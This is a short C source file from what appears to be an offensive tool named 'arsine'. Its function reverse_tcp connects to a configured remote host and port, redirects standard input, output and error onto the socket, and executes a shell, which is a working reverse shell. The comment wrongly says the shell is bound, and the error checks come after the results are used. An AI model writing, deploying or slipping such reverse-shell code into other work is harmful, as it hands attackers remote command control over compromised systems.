#include "header.h"

/**
 * reverse_tcp - opens up a socket and binds a shell to it
 * @arsine: struct holding all arsine info
 */
void reverse_tcp(const arsine_t *arsine)
{
    int sockfd;
    int ret;
    int con;
    struct addrinfo hints;
    struct addrinfo *res;
    char *ex[3];

    memset(&hints, 0, sizeof(hints));
    hints.ai_family = arsine->family;
    hints.ai_socktype = SOCK_STREAM;

    ret = getaddrinfo(arsine->host, arsine->service, &hints, &res);
    sockfd = socket(res->ai_family, res->ai_socktype, res->ai_protocol);
    con = connect(sockfd, res->ai_addr, res->ai_addrlen);

    if (ret != 0 )
        return;

    if (sockfd < 0 )
        return;

    if (con < 0 )
        return;

    /* Replace stdin, stdout and stderr from the socket
     */
    dup2(sockfd, STDIN_FILENO);
    dup2(sockfd, STDOUT_FILENO);
    dup2(sockfd, STDERR_FILENO);

    ex[0] = arsine->shell;
    ex[1] = SHELL;
    ex[2] = NULL;

    execve(ex[0], &ex[1], &ex[2]);

}
